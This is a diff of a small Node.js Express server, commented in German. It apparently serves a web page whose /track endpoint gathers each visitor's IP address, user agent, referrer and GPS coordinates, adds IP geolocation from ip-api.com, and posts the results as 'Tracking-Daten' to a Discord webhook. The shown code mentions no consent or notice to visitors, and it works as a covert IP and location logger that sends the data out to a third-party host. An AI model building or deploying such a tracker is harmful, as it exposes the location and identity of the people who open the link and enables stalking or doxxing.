@@ -1,4 +1,4 @@
-// server.js  — nur Discord, keine DB
+// server.js — nur Discord, keine DB
 const express = require('express');
 const axios = require('axios');
 
@@ -7,22 +7,22 @@ const port = process.env.PORT || 3000;
 
 app.set('trust proxy', true);
 app.use(express.json());
-app.use(express.static('public'));
+app.use(express.static('public')); // / -> public/index.html
 
 const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL;
 
-// IP sauber ermitteln (Proxy-freundlich)
+// IP ermitteln (Proxy-freundlich)
 function getClientIp(req) {
-  const xf = req.headers['x-forwarded-for'];
+  // Render setzt x-forwarded-for korrekt
+  const xf = req.headers['x-forwarded-for'] || req.headers['x-real-ip'];
   if (xf) return String(xf).split(',')[0].trim().replace(/^::ffff:/, '');
   return (req.socket?.remoteAddress || '').replace(/^::ffff:/, '');
 }
 
-// Health / Root
+// Health (für Render)
 app.get('/health', (_, res) => res.send('ok'));
-app.get('/', (_, res) => res.send('Server läuft ✅'));
 
-// Track: nimmt Daten aus Query (deinem HTML) und postet sie zu Discord
+// Track: nimmt Daten aus Query (vom HTML) und postet zu Discord
 app.get('/track', async (req, res) => {
   const ip = getClientIp(req);
   const userAgent = req.headers['user-agent'] || '';
@@ -34,7 +34,7 @@ app.get('/track', async (req, res) => {
     referrer
   } = req.query;
 
-  // Falls gewünscht: kurze IP-Geolocation (optional, aber praktisch)
+  // optional: IP-Geolocation (GPS hat Vorrang, falls vorhanden)
   let location = {};
   try {
     const r = await axios.get(`http://ip-api.com/json/${ip}`, { timeout: 4000 });
@@ -43,14 +43,12 @@ app.get('/track', async (req, res) => {
         city: r.data.city,
         region: r.data.regionName || r.data.region,
         country: r.data.country,
-        latitude: lat || r.data.lat,   // GPS bevorzugen, falls vorhanden
+        latitude: lat || r.data.lat,
         longitude: lon || r.data.lon,
         isp: r.data.isp
       };
     }
-  } catch (e) {
-    // still ok
-  }
+  } catch { /* egal */ }
 
   const embeds = [{
     title: 'Tracking-Daten',
@@ -93,9 +91,8 @@ app.get('/track', async (req, res) => {
   res.send('Daten empfangen');
 });
 
+// WICHTIG: **KEINE** eigene Root-Route, damit / die public/index.html lädt!
+
 app.listen(port, () => {
   console.log(`Server läuft auf Port ${port}`);
 });
-
-
-
